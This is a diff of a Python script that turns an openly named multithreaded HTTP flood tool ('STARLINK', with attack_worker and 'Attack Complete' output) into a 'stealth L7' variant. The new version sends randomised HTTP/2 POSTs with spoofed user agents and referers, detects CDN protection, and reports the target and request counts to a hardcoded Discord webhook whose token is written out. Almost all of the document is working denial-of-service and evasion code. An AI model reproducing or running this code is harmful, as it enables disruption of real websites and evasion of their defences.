@@ -1,193 +1,282 @@
 #!/usr/bin/env python3
 """
-STARLINK - High RPS Cache Buster
+MK2VOIDLINK - Stealth L7 Pinger (HTTP/2 Only)
 """
 
-import socket
-import ssl
+import httpx
 import time
 import random
 import string
-import threading
-from datetime import datetime
+from datetime import datetime, timezone
 from colorama import init, Fore, Style
-import concurrent.futures
+import requests
+import asyncio
 
 init(autoreset=True)
 
-# Colors
-CYAN = Fore.CYAN
-GREEN = Fore.GREEN
-RED = Fore.RED
-YELLOW = Fore.YELLOW
-RESET = Style.RESET_ALL
+# Custom orange (ANSI 256)
+ORANGE = '\033[38;5;214m'
+BRIGHT_WHITE = Style.BRIGHT + Fore.WHITE
 
-class StarLink:
-    def __init__(self, target, threads=500, duration=60):
-        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
-        self.path = '/' + '/'.join(target.replace('https://', '').replace('http://', '').split('/')[1:]) if '/' in target else '/'
-        self.threads = threads
-        self.duration = duration
-        self.running = True
-        self.request_count = 0
+class MK2VoidLink:
+    def __init__(self, target, webhook_url):
+        self.target = target
+        self.webhook_url = webhook_url
+        self.last_log = 0
+        self.last_discord_log = 0
         self.start_time = datetime.now()
-        self.lock = threading.Lock()
+        self.request_count = 0
+        self.session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+        self.last_status = "None"
+        self.last_response_info = "None"
         
-        # Pre-generated cache busters (speed optimization)
-        self.cache_busters = [f"?cache={i}" for i in range(1000, 9999)]
-        self.cache_busters += [f"?v={i}" for i in range(1, 1000)]
-        self.cache_busters += [f"?cb={random.randint(10000,99999)}" for _ in range(1000)]
-        
-        # Pre-generated user agents
+        # User agents
         self.agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         ]
         
-        # Pre-built request templates (speed optimization)
-        self.request_templates = []
-        for agent in self.agents:
-            req = f"GET {self.path} CACHEBUSTER {random.choice(['HTTP/1.0', 'HTTP/1.1'])}\r\n"
-            req += f"Host: {self.target}\r\n"
-            req += f"User-Agent: {agent}\r\n"
-            req += "Accept: */*\r\n"
-            req += "Accept-Language: en-US\r\n"
-            req += "Connection: keep-alive\r\n"
-            req += "Cache-Control: no-cache\r\n"
-            req += "Pragma: no-cache\r\n"
-            req += "\r\n"
-            self.request_templates.append(req)
+        # Unblockable referers
+        self.refs = [
+            "https://www.google.com/",
+            "https://www.bing.com/",
+            "https://duckduckgo.com/",
+            "https://www.reddit.com/",
+            "https://twitter.com/",
+            "https://www.facebook.com/",
+            "https://www.instagram.com/",
+            "https://www.youtube.com/",
+            "https://archive.org/",
+            "https://en.wikipedia.org/"
+        ]
         
-        print(f"\n{CYAN}STARLINK High RPS Mode{RESET}")
-        print(f"Target: {target}")
-        print(f"Threads: {threads}")
-        print(f"Duration: {duration}s")
+        # Setup HTTP/2 client
+        self.client = httpx.Client(http2=True, verify=False, timeout=10.0)
+        
+        # Send startup webhook
+        self.send_startup_webhook()
+        
+    def rand_str(self, n=8):
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+    
+    def format_size(self, size):
+        if size < 1024:
+            return f"{size}B"
+        elif size < 1024**2:
+            return f"{size/1024:.2f}KB"
+        elif size < 1024**3:
+            return f"{size/1024**2:.2f}MB"
+        else:
+            return f"{size/1024**3:.2f}GB"
+    
+    def detect_cdn(self, headers):
+        headers_str = str(headers).lower()
+        if 'cloudflare' in headers_str or 'cf-ray' in headers_str:
+            return 'cloudflare'
+        if 'akamai' in headers_str:
+            return 'akamai'
+        if 'sucuri' in headers_str:
+            return 'sucuri'
+        if 'incapsula' in headers_str:
+            return 'incapsula'
+        return None
+    
+    def send_startup_webhook(self):
+        """Send startup message to Discord"""
+        embed = {
+            "title": f"🚀 MK2VOIDLINK (HTTP/2) - Session Started",
+            "color": 0x00ff00,
+            "fields": [
+                {
+                    "name": "Session",
+                    "value": f"`{self.session_id}`",
+                    "inline": True
+                },
+                {
+                    "name": "Target",
+                    "value": f"`{self.target}`",
+                    "inline": True
+                },
+                {
+                    "name": "Start Time",
+                    "value": f"`{self.start_time.strftime('%Y-%m-%d %H:%M:%S')}`",
+                    "inline": True
+                }
+            ],
+            "footer": {
+                "text": "MK2VOIDLINK • HTTP/2 Only"
+            },
+            "timestamp": datetime.now(timezone.utc).isoformat()
+        }
+        
+        try:
+            requests.post(self.webhook_url, json={"embeds": [embed]})
+        except:
+            pass
+    
+    def send_update_webhook(self):
+        """Send update to Discord every 2-5 minutes"""
+        running_time = str(datetime.now() - self.start_time).split('.')[0]
+        
+        embed = {
+            "title": f"📡 MK2VOIDLINK (HTTP/2) - ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) - (Session {self.session_id})",
+            "color": 0x3498db,
+            "fields": [
+                {
+                    "name": "🎯 Target",
+                    "value": f"```{self.target}```",
+                    "inline": False
+                },
+                {
+                    "name": "📊 Requests",
+                    "value": f"```{self.request_count}```",
+                    "inline": True
+                },
+                {
+                    "name": "⏱️ Session Time",
+                    "value": f"```{running_time}```",
+                    "inline": True
+                },
+                {
+                    "name": "━━━━━━━━━━━━━━━━━━━━━━",
+                    "value": "**Last Response Info**",
+                    "inline": False
+                },
+                {
+                    "name": "📨 Last Response",
+                    "value": f"```{self.last_response_info}```",
+                    "inline": False
+                },
+                {
+                    "name": "🔢 Last Response Code",
+                    "value": f"```{self.last_status}```",
+                    "inline": False
+                }
+            ],
+            "footer": {
+                "text": f"Session {self.session_id} • HTTP/2 • Update every 2-5min"
+            },
+            "timestamp": datetime.now(timezone.utc).isoformat()
+        }
+        
+        try:
+            requests.post(self.webhook_url, json={"embeds": [embed]})
+        except:
+            pass
+    
+    def send_req(self):
+        start = time.time()
+        self.request_count += 1
+        
+        try:
+            rand_param = self.rand_str(8)
+            
+            # Build headers
+            headers = {
+                'User-Agent': random.choice(self.agents),
+                'Accept': 'text/html,application/xhtml+xml',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Cache-Control': 'no-cache',
+                'Referer': random.choice(self.refs),
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+            
+            # POST with GET parameter in URL
+            url = f"https://{self.target}/?{rand_param}"
+            
+            # Send request using HTTP/2
+            response = self.client.post(url, headers=headers, data="")  # Empty POST data
+            
+            resp_time = (time.time() - start) * 1000
+            status = response.status_code
+            
+            # Detect CDN
+            cdn = self.detect_cdn(response.headers)
+            if cdn:
+                if cdn == 'cloudflare':
+                    hit_color = ORANGE
+                    hit_text = f"cdn-cloudflare"
+                else:
+                    hit_color = Fore.RED
+                    hit_text = f"cdn-{cdn}"
+            else:
+                hit_color = BRIGHT_WHITE
+                hit_text = f"org-{self.target}"
+            
+            if status < 400:
+                result = f"{Fore.GREEN}pxn-s{Style.RESET_ALL}"
+                log_result = "pxn-s"
+            else:
+                result = f"{Fore.RED}intercepted{Style.RESET_ALL}"
+                log_result = "intercepted"
+            
+            # Store last response info
+            self.last_response_info = f"{hit_text} | {self.format_size(len(response.content))} | {resp_time:.2f}ms | {log_result}"
+            self.last_status = str(status)
+            
+            current_time = time.time()
+            
+            # Terminal output every 3 seconds
+            if current_time - self.last_log >= 3:
+                print(f"MK2VOIDLINK (H2) ---> ({hit_color}{hit_text}{Style.RESET_ALL}) ↓")
+                print(f"({resp_time:.2f}ms) ---> {status} ←")
+                print(f"({self.format_size(len(response.content))}) ---> {result}")
+                print()
+                self.last_log = current_time
+            
+            # Discord logging every 2-5 minutes
+            if current_time - self.last_discord_log >= random.uniform(120, 300):
+                self.send_update_webhook()
+                self.last_discord_log = current_time
+            
+            return True
+            
+        except Exception as e:
+            resp_time = (time.time() - start) * 1000
+            
+            # Store last response info
+            self.last_response_info = f"org-{self.target} | 0B | {resp_time:.2f}ms | intercepted"
+            self.last_status = "000"
+            
+            current_time = time.time()
+            
+            # Terminal output every 3 seconds
+            if current_time - self.last_log >= 3:
+                print(f"MK2VOIDLINK (H2) ---> ({BRIGHT_WHITE}org-{self.target}{Style.RESET_ALL}) ↓")
+                print(f"({resp_time:.2f}ms) ---> 000 ←")
+                print(f"(0B) ---> {Fore.RED}intercepted{Style.RESET_ALL}")
+                print(f"Error: {str(e)[:50]}")
+                print()
+                self.last_log = current_time
+            
+            # Discord logging every 2-5 minutes
+            if current_time - self.last_discord_log >= random.uniform(120, 300):
+                self.send_update_webhook()
+                self.last_discord_log = current_time
+            
+            return False
+    
+    def run(self):
+        startup_time = self.start_time.strftime("%Y-%m-%d %H:%M:%S")
+        print(f"\n{Fore.CYAN}MK2VOIDLINK (HTTP/2) ({startup_time}) - Target: {self.target} \\ Discord logging active (every 2-5min){Style.RESET_ALL}")
         print("=" * 60)
         
-    def build_request(self):
-        """Fast request builder"""
-        template = random.choice(self.request_templates)
-        cache_buster = random.choice(self.cache_busters)
-        return template.replace('CACHEBUSTER', cache_buster).encode()
-    
-    def attack_worker(self):
-        """Single worker - keeps connections alive"""
-        # Pre-create socket
-        host = self.target.split(':')[0]
-        port = 443 if 'https' in str(self.target) or ':443' in str(self.target) else 80
-        
-        # Keep connection pool
-        sockets = []
-        for _ in range(10):  # 10 connections per thread
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                if port == 443:
-                    context = ssl.create_default_context()
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    sock = context.wrap_socket(sock, server_hostname=host)
-                sock.connect((host, port))
-                sockets.append(sock)
-            except:
-                continue
-        
-        if not sockets:
-            return
-        
-        # Attack loop
-        sock_index = 0
-        while self.running:
-            try:
-                # Round-robin sockets
-                sock = sockets[sock_index % len(sockets)]
-                sock_index += 1
-                
-                # Send request
-                request = self.build_request()
-                sock.send(request)
-                
-                # Try to read response (non-blocking)
-                try:
-                    sock.recv(4096)
-                except:
-                    # Reconnect dead socket
-                    try:
-                        sock.close()
-                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        new_sock.settimeout(2)
-                        if port == 443:
-                            context = ssl.create_default_context()
-                            context.check_hostname = False
-                            context.verify_mode = ssl.CERT_NONE
-                            new_sock = context.wrap_socket(new_sock, server_hostname=host)
-                        new_sock.connect((host, port))
-                        sockets[sock_index % len(sockets)] = new_sock
-                    except:
-                        pass
-                
-                # Count request
-                with self.lock:
-                    self.request_count += 1
-                
-            except:
-                pass
-    
-    def monitor(self):
-        """Monitor and display stats"""
-        last_count = 0
-        while self.running:
-            time.sleep(1)
-            elapsed = (datetime.now() - self.start_time).seconds
-            current = self.request_count
-            rps = current - last_count
-            last_count = current
-            
-            print(f"\r{CYAN}[{elapsed}s]{RESET} Requests: {current} | RPS: {rps} | Total: {rps*elapsed}", end='', flush=True)
-            
-            if elapsed >= self.duration:
-                self.running = False
-                break
-    
-    def start(self):
-        """Start attack"""
-        # Start threads
-        threads = []
-        for i in range(self.threads):
-            t = threading.Thread(target=self.attack_worker)
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        # Start monitor
-        monitor = threading.Thread(target=self.monitor)
-        monitor.daemon = True
-        monitor.start()
-        
-        # Wait for duration
-        time.sleep(self.duration + 1)
-        
-        # Summary
-        elapsed = (datetime.now() - self.start_time).seconds
-        print(f"\n\n{YELLOW}═══ Attack Complete ═══{RESET}")
-        print(f"Total Requests: {self.request_count}")
-        print(f"Average RPS: {self.request_count/elapsed:.1f}")
-        print(f"Duration: {elapsed}s")
+        try:
+            while True:
+                self.send_req()
+                time.sleep(random.uniform(2, 3))
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}Stopped{Style.RESET_ALL}")
+            self.client.close()
 
 if __name__ == "__main__":
     import sys
-    
     if len(sys.argv) < 2:
-        print("Usage: python starlink.py <target> [threads] [duration]")
-        print("Example: python starlink.py https://example.com 1000 60")
+        print("Usage: python mk2voidlink.py <target>")
         sys.exit(1)
     
-    target = sys.argv[1]
-    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
-    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
-    
-    star = StarLink(target, threads, duration)
-    star.start()
+    webhook = "https://discord.com/api/webhooks/1478911049263612055/iAcn2jqsiWMonGi7Q74k2s4utvR5ERn2sdYOM3j0FqqwnkhugMsPJTfz3oNvrouCwYUr"
+    v = MK2VoidLink(sys.argv[1], webhook)
+    v.run()
